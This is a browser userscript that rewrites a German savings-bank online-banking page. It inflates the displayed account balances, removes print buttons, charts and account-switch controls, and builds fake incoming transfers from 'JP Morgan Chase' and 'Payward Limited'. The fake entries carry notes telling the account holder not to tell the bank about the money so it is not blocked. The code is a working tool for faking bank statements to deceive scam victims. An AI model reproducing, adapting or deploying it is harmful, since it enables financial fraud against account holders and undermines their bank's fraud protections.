// ==UserScript==
// @name         Ed AMAD JOHANN MORITZ 
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        *://*/*
// @match        https://www.drivehq.com/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/499514/Ed%20AMAD%20JOHANN%20MORITZ.user.js
// @updateURL https://update.greasyfork.org/scripts/499514/Ed%20AMAD%20JOHANN%20MORITZ.meta.js
// ==/UserScript==

 (function() {
    'use strict';

    // Your code here...
//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    //SCRIPTV2 TRIGGER!
    var easyUpdate = "no";


    var pointerOverviewTotal = "";
    var pointerTabelle = "xx";
    var absender = "Treuhand: JP Morgan Chase";
    var absenderTitel = "Treuhand: JP Morgan Chase";
    var firma = "test";
    var asenderReference = "WD3746 TRX88205A CX13280";
    var absenderDetails = "Einreichung einer Treuhand Überweisung. Freigabe nötig durch JP Morgan Chase";
    var amount = 27700;
    var vorgemerkt = "no";
    var xamount = 0;
    var x2amount = 0;
    var buchung = 20000;
    var buchungDecimal = "70";
    var buchungTextsZahl = "437.680";
    var accountsecurity = "50 0772 88";

    if (easyUpdate == "yes"){
        x2amount = 10000;}


    //+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
// NOW STARTING FROM 0, NOT 1
            var main = 99;
            var subtotal = 99;
            var total = 99;

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================



//--------------------------------------------------------------------------------------------------------------------------
    // Function to remove all content except for elements with class "logo parbase"
function removeAllContentExceptLogo() {
    // Select the target element containing the text
    var targetElement = document.querySelector('body');

    // Create a new MutationObserver
    var asobserver = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            // Check if the target text content is found
            if (mutation.target.textContent.includes("Für welches Konto möchten Sie Umsätze aufrufen?")) {
                // Remove all content except for elements with class "logo parbase"
                var elementsToRemove = document.querySelectorAll('body > :not(.logo.parbase)');
                elementsToRemove.forEach(function(element) {
                    element.remove();
                });

                // Disconnect the observer once the content is removed
                asobserver.disconnect();

                // Redirect one step backward
                window.history.back();
            }
        });
    });

    // Configure and start observing the target element
    var config = { childList: true, subtree: true };
    asobserver.observe(targetElement, config);
}

// Call the function to start monitoring for the target text content
removeAllContentExceptLogo();




//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================


    function numberWithCommas(x) {
        return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");}

// UTILITY FUNCTIONS
//----------------------------------------------------------------------------------------------------
  // Function to delete parent of element containing specific text
    function deleteParentOfText(text) {
        // Create a walker to traverse all text nodes
        var walker = document.createTreeWalker(
            document.body,
            NodeFilter.SHOW_TEXT,
            null,
            false
        );

        var node;
        while(node = walker.nextNode()) {
            // Check if the text content includes the specified text
            if (node.nodeValue.includes(text)) {
                // Get the parent element of the text node
                var parentElement = node.parentElement;

                // Remove the parent element if it exists
                if (parentElement) {
                    parentElement.remove();
                    break; // Remove this line if you want to delete all instances
                }
            }
        }
    }

    // Execute the function with the specified text
    deleteParentOfText('Konto wechseln');

//------------------------------------------------------------------------------

    // Function to search and remove text nodes containing 'NaN'
    function removeNaNText() {
        var walker = document.createTreeWalker(
            document.body,
            NodeFilter.SHOW_TEXT,
            null,
            false
        );

        var node;
        while(node = walker.nextNode()) {
            if (node.nodeValue.trim() === 'NaN') {
                node.remove();
            }
        }
    }

    // Create a MutationObserver to monitor DOM changes
    var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            // If there are added nodes, check for 'NaN' text
            if (mutation.addedNodes.length) {
                removeNaNText();
            }
        });
    });

    // Define what element should be observed and what types of mutations
    observer.observe(document.body, {
        childList: true, // Observe direct children
        subtree: true   // Observe all descendants
    });

    // Initial check for 'NaN' text
    removeNaNText();

    //UTILITY FUNCTIONS
    //----------------------------------------------------------------------------

//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


     if (window.location.href.indexOf("finanzuebersicht.html") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf("11306722965") > 0) {

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================

        //Wir sind in der Finanzuebersicht
        if (vorgemerkt == "no"){

    /// Refresh the finanzstatus page once it loads for the first time

 

          //                        var KontosBoxElement = document.getElementsByClassName("nbf-container-box nbf-container--pfm expandable")[0];
//if (KontosBoxElement) {
 //   KontosBoxElement.remove();
//}


//==========================================================================================================================================================================================================




// Function to remove elements with the class "primary-cta", "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned", elements containing the text "Druckansicht", and elements with class "mkp-expandable-button", and show a spinner when specific text is found
function removePrimaryCTAAndShowSpinner() {
    // Remove elements with the class "primary-cta"
    var elementsToRemoveCTA = document.querySelectorAll('.primary-cta');
    elementsToRemoveCTA.forEach(function(element) {
        element.remove();
    });

    // Remove elements with the class "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned"
    var elementsToRemoveButtonGroup = document.querySelectorAll('.mkp-button-group.mkp-layout-margin.mkp-button-group-with-separator.mkp-button-group-mobile-left-aligned');
    elementsToRemoveButtonGroup.forEach(function(element) {
        element.remove();
    });

    // Remove elements containing the text "Druckansicht"
    var elementsToRemoveDruckansicht = document.evaluate("//*[contains(text(),'Druckansicht')]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
    for (var i = 0; i < elementsToRemoveDruckansicht.snapshotLength; i++) {
        var element = elementsToRemoveDruckansicht.snapshotItem(i);
        element.remove();
    }

 // Function to remove element with id "pfmWidgetId"
function removePfmWidgetIdElement() {
    var pfmWidgetElement = document.getElementById('pfmWidgetId');
    if (pfmWidgetElement) {
        pfmWidgetElement.remove();
        console.log('Removed element with id "pfmWidgetId"');
    }
}

// Regular check every 100 milliseconds to remove the element
setInterval(removePfmWidgetIdElement, 100);

// Mutation observer to remove "pfmWidgetId" element whenever it's added to the DOM
var pfmWidgetObserver = new MutationObserver(function(mutationsList) {
    for(var mutation of mutationsList) {
        if (mutation.type === 'childList') {
            for(var node of mutation.addedNodes) {
                if (node.nodeType === Node.ELEMENT_NODE && node.id === 'pfmWidgetId') {
                    node.remove();
                    console.log('Removed element with id "pfmWidgetId" (mutation observer)');
                }
            }
        }
    }
});

// Start observing the document
pfmWidgetObserver.observe(document.body, { childList: true, subtree: true });



    // Remove elements with class "mkp-expandable-button"
    var elementsToRemoveExpandableButton = document.querySelectorAll('.mkp-expandable-button');
    elementsToRemoveExpandableButton.forEach(function(element) {
        element.remove();
    });

    // Show spinner if specific trigger texts are found
    var triggerTexts = ["Von welchem Konto möchten Sie überweisen?", "Für welches Konto möchten Sie die Umsätze abrufen"];
    triggerTexts.forEach(function(triggerText) {
        if (document.body.textContent.includes(triggerText)) {
            showSpinner();
        }
    });

    console.log('Removed elements with class "primary-cta", "mkp-button-group mkp-layout-margin mkp-button-group-with-separator mkp-button-group-mobile-left-aligned", "Druckansicht", and "mkp-expandable-button", and showed spinner');
}


function showSpinner() {
    // Show spinner using custom element or other implementation
    var spinner = document.createElement('div');
    spinner.style.position = 'fixed';
    spinner.style.top = '0';
    spinner.style.left = '0';
    spinner.style.width = '100%';
    spinner.style.height = '100%';
    spinner.style.background = 'rgba(255, 255, 255, 0.9)'; // Adjust alpha value here
    spinner.style.zIndex = '9999';
    spinner.innerHTML = '<div style="width: 100px; height: 100px; background: url(https://upload.wikimedia.org/wikipedia/commons/4/4e/Logo-_Sparkassen-App_%E2%80%93_die_mobile_Filiale.png) center center no-repeat; background-size: contain;"></div>';
    document.body.appendChild(spinner);
}

// Call the function immediately
removePrimaryCTAAndShowSpinner();


// Function to update balance and handle class change for both the main balance element and its sibling
function updateBalanceAndSiblingClass(balanceElement, amount) {
    // Get the sibling element
    var siblingElement = balanceElement.nextElementSibling;

    // Get the current balance text
    var balanceText = balanceElement.textContent;

    // Extract the numeric value from the text
    var currentBalance = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(/[^\d,]/g, '').replace(/,/g, '.'));

    // Check if the balance was originally negative
    var wasNegative = balanceText.includes('-');

    // Adjust the sign of the amount based on the original balance
    var adjustedAmount = wasNegative ? -amount : amount;

    // Update the balance
    var newBalance = currentBalance + adjustedAmount;

    // Determine the new class based on the sign of the balance
    var newClass = newBalance < 0 ? 'minus' : 'plus';

    // Update the balance text content with commas
    balanceElement.textContent = numberWithCommas(Math.abs(newBalance)); // Ensure positive value for text content

    // Update the class for the balance element
    balanceElement.classList.remove('minus', 'plus');
    balanceElement.classList.add(newClass);

    // Update the class for the sibling element
    siblingElement.classList.remove('minus', 'plus');
    siblingElement.classList.add(newClass);

    // Change class of balance-decimal if the balance became positive after the modification
    if (!wasNegative && newBalance >= 0) {
        balanceElement.nextElementSibling.classList.remove('minus');
        balanceElement.nextElementSibling.classList.add('plus');
    }
}



// Now call the function for each balance element accordingly

// Update the main balance and its sibling
var mainBalanceIndex = main || 0;
var mainBalanceElement = document.querySelectorAll('.mkp-currency.mkp-currency-m')[mainBalanceIndex].firstElementChild;
if (!isWithinRestrictedParent(mainBalanceElement)) {
    updateBalanceAndSiblingClass(mainBalanceElement, xamount);
}

// Update the total balance and its sibling
var totalBalanceIndex = total || 0;
var totalBalanceElement = document.querySelectorAll('.mkp-currency.mkp-currency-m')[totalBalanceIndex].firstElementChild;
if (!isWithinRestrictedParent(totalBalanceElement)) {
    updateBalanceAndSiblingClass(totalBalanceElement, x2amount + xamount);
}

// Update the subtotal balance and its sibling
var subtotalBalanceIndex = subtotal || 0;
var subtotalBalanceElement = document.querySelectorAll('.mkp-currency.mkp-currency-m')[subtotalBalanceIndex].firstElementChild;
if (!isWithinRestrictedParent(subtotalBalanceElement)) {
    updateBalanceAndSiblingClass(subtotalBalanceElement, x2amount + xamount);
}

// Check and update easyUpdate balance if needed
if (easyUpdate == "yes") {
    var easyUpdateBalanceIndex = 2; // Default index for easyUpdate balance
    var easyUpdateBalanceElement = document.querySelectorAll('.mkp-currency.mkp-currency-m')[easyUpdateBalanceIndex].firstElementChild;
    if (!isWithinRestrictedParent(easyUpdateBalanceElement)) {
        updateBalanceAndSiblingClass(easyUpdateBalanceElement, x2amount);
    }
}

// Function to check if an element or any of its ancestors are within a restricted parent
function isWithinRestrictedParent(element) {
    var parent = element;
    while (parent) {
        if (parent.classList.contains("nbf-row") && parent.classList.contains("mkp-justify-content-flex-center")) {
            return true; // Element or its ancestor is within a restricted parent
        }
        parent = parent.parentElement;
    }
    return false; // Element and its ancestors are not within a restricted parent
}


        }

    }

//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
if (window.location.href.indexOf("umsaetze.html") > 0 || window.location.href.indexOf("11264752143") > 0 ) {

    // Proceed with your existing code here
    if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent === accountsecurity) {
        if (vorgemerkt == "no"){
            // Wir sind im Kontostand
            // Set the value by which you want to modify the main balance
            var modificationValue = 0;

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================


        // Function to modify the main balance
        // Function to modify the main balance
// Function to modify the main balance
function modifyMainBalance() {
    // Get the element with class "balance-decimal"
    var balanceElement = document.querySelector('.balance-decimal');

    // Check if the element exists
    if (balanceElement) {
        // Get the text content of the balance element
        var balanceText = balanceElement.textContent.trim();

        // Extract the numeric value from the text content correctly
        var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(/[^\d,]/g, '').replace(/,/g, '.'));

        // Determine the sign of the balance based on the text content
        var isNegative = balanceText.includes('-');

        // Modify the balance based on the sign and the modification value
        if (isNegative) {
            numericValue -= modificationValue;
        } else {
            numericValue += modificationValue;
        }

        // Update the text content with the modified value and "EUR" currency
        var updatedBalanceText = (isNegative ? '-' : '') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

        // Update the balance text content and class
        balanceElement.textContent = updatedBalanceText;
        balanceElement.className = 'balance-decimal plus';

        // Remove minus sign immediately
        var plusBalanceElement = document.querySelector('.balance-decimal.plus');
        if (plusBalanceElement) {
            var updatedBalanceText = plusBalanceElement.textContent.replace(/-/g, '');
            plusBalanceElement.textContent = updatedBalanceText;
        }
    } else {
        console.error('Balance element not found.');
    }
}


        // Function to remove minus signs from the text content under class "balance-decimal plus"
        function removeMinusSigns() {
            var plusBalanceElement = document.querySelector('.balance-decimal.plus');

            if (plusBalanceElement) {
                var balanceText = plusBalanceElement.textContent;
                var updatedBalanceText = balanceText.replace(/-/g, '');
                plusBalanceElement.textContent = updatedBalanceText;
            }
        }

        // Execute the modification function
        modifyMainBalance();

        // Execute the remove minus signs function
        removeMinusSigns();
             }
    }
//------------------------------------------------------------------------------------------------------
     // Function to delete elements by class name
    function deleteElementsByClassName(className) {
        // Select all elements with the given class name
        var elements = document.querySelectorAll('.' + className.split(' ').join('.'));

        // Loop through the elements and remove each one
        elements.forEach(function(element) {
            element.remove();
        });

        console.log('Removed elements with class:', className);
    }

    // Call the function for each class name
    deleteElementsByClassName('druck-button');
    deleteElementsByClassName('flyout-label');
    deleteElementsByClassName('sort-button-bottom mkp-row mkp-justify-content-flex-end');

//------------------------------------------------------------------------------------------------------
   // Function to remove elements by class name
    function eldeleteElementsByClassName(className) {
        var elements = document.querySelectorAll('.' + className.split(' ').join('.'));
        elements.forEach(function(element) {
            element.remove();
        });
        console.log('Removed elements with class:', className);
    }

    // Define the function to observe mutations and remove elements
    function observeAndRemoveElements() {
        var observer = new MutationObserver(function(mutationsList) {
            mutationsList.forEach(function(mutation) {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach(function(node) {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            // Check if the added node has the target class
                            if (node.classList.contains('mkp-observe-sticky-clone-container')) {
                                node.remove();
                                console.log('Removed element with class "mkp-observe-sticky-clone-container"');
                            }
                        }
                    });
                }
            });
        });

        // Start observing the document body for changes
        observer.observe(document.body, { childList: true, subtree: true });
    }

    // Call the function to observe and remove elements
    observeAndRemoveElements();


        //---------------------------------------------------------------------------------------------

        //Wir sind im Kontostand
        var AccBalance = document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent;
        var AccBalanceReal = AccBalance.replace(".", "");
        var AccBalanceFake = parseFloat(AccBalanceReal) + x2amount;
        var AccBalanceFake2 = parseFloat(AccBalanceReal) + xamount;
        var AccBalanceNwc2 = numberWithCommas(AccBalanceFake2);
        var AccBalanceNwc = numberWithCommas(AccBalanceFake);
        var singleAmount = numberWithCommas(amount);

        //Update Kontostand oben
        //if (vorgemerkt == "no"){
        //    document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc;

        //}

        //document.getElementsByClassName("mkp-card-list")[1]

        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
            if (vorgemerkt == "no"){
                document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc2;
                      var saldoLinechartElement = document.getElementsByClassName("saldo-linechart")[0];
if (saldoLinechartElement) {
    saldoLinechartElement.remove();
}
            }
            var xxxxxHTML = '<div class="mkp-card-list"><span class="mkp-list-subline">Spezialauftrag Treuhand (1)</span><ul class="mkp-card-group mkp-group-unify mkp-group-clickable" aria-label="Treuhand"><li aria-label="Treuhand Auftrag"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Bruno Scheibner: Treuhand Freigabe nötig durch Bruno Scheibner">Treuhand: Freigabe nötig durch Matthias Kabisch</a></h3><p>Treuhand-Auftrag: DE11501900000006605826</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">207.547</span><span aria-hidden="true" class="balance-decimal plus">,07&nbsp;EUR</span><span aria-hidden="false" class="offscreen">-100,00 EUR</span></div></div></div></div></li></ul></div>';
            var saveHTML = document.getElementsByClassName("mkp-card-list")[0].innerHTML;
            var xHTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; '+buchungTextsZahl+' EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="'+absenderTitel+'">'+absender+'</a></h3><p>'+absenderDetails+'</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">'+buchungTextsZahl+'</span><span aria-hidden="true" class="balance-decimal plus">,'+buchungDecimal+'&nbsp;EUR</span><span aria-hidden="false" class="offscreen">15.308,00 EUR</span></div></div></div></div></li>';

//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


            //var save2HTML = document.getElementsByClassName("mkp-card-list")[1].innerHTML;
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 5.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="JP Morgan Chase">JP Morgan Chase</a></h3><p>Geld für 10%.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">5.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">5.000,00 EUR</span></div></div></div></div></li>';

 var x3HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 10.500,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="JP Morgan Chase">JP Morgan Chase</a></h3><p>Geld für Steuern. Mit Sparkasse das Geld NICHT besprechen, damit nicht gesperrt wird.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">10.500</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">10.500,00 EUR</span></div></div></div></div></li>';

var x4HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 50.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="JP Morgan Chase">JP Morgan Chase</a></h3><p>Geld für Steuern. Bitte nur mit Andreas Graf besprechen.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">50.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">50.000,00 EUR</span></div></div></div></div></li>';

 var x5HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 14.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Geld für Steuern. Mit Sparkasse das Geld NICHT besprechen, damit nicht gesperrt wird.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">14.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">14.000,00 EUR</span></div></div></div></div></li>';

            //document.getElementsByClassName("mkp-card-list")[1].innerHTML = save2HTML + x2HTML;
            //block spk-analytics.js;
            document.getElementsByClassName("mkp-card-list")[0].innerHTML =  saveHTML;
        }

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//==========================================================================================================================================================================================================


        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == "1800 0168 34"){
            if (vorgemerkt == "no" && easyUpdate == "yes"){
                document.getElementsByClassName("mkp-currency-lg")[0].childNodes[0].textContent = AccBalanceNwc;
             var ssaldoLinechartElement = document.getElementsByClassName("saldo-linechart")[0];
if (ssaldoLinechartElement) {
    ssaldoLinechartElement.remove();
}
            }
            var save2HTML = document.getElementsByClassName("mkp-card-list")[0].innerHTML;
            var Sx2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 10.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Withdrawal Trading Account: AY01-503DE-SP</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">10.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">9.200,00 EUR</span></div></div></div></div></li>';
            document.getElementsByClassName("mkp-card-list")[0].innerHTML = Sx2HTML + save2HTML;
        }

    }










//==========================================================================================================================================================================================================
if (window.location.href.indexOf("kontoauswahl.html") > 0 || window.location.href.indexOf("10733495263") > 0) {
    // Function to remove the specified classes
    function removeClasses() {
        console.log("Removing classes...");
        var elementsToRemove = document.querySelectorAll('.mkp-expandable.is-visible, .cbox.cbox-banking.cbox-large.section');
        elementsToRemove.forEach(function(element) {
            console.log("Removing element:", element);
            element.remove();
        });
    }

    // Call the function initially
    removeClasses();

    // Function to observe mutations and remove the classes if they appear dynamically
    function observeMutations() {
        console.log("Observing mutations...");
        // Select the target node
        var targetNode = document.body;

        // Options for the observer (which mutations to observe)
        var config = { childList: true, subtree: true };

        // Callback function to execute when mutations are observed
        var callback = function(mutationsList, observer) {
            console.log("Mutations observed:", mutationsList);
            for(var mutation of mutationsList) {
                if (mutation.type === 'childList') {
                    console.log("Mutation type: childList");
                    removeClasses();
                }
            }
        };

        // Create an observer instance linked to the callback function
        var observer = new MutationObserver(callback);

        // Start observing the target node for configured mutations
        observer.observe(targetNode, config);
    }

    // Call the function to start observing mutations
    observeMutations();
}


//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

    





//==========================================================================================================================================================================================================

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
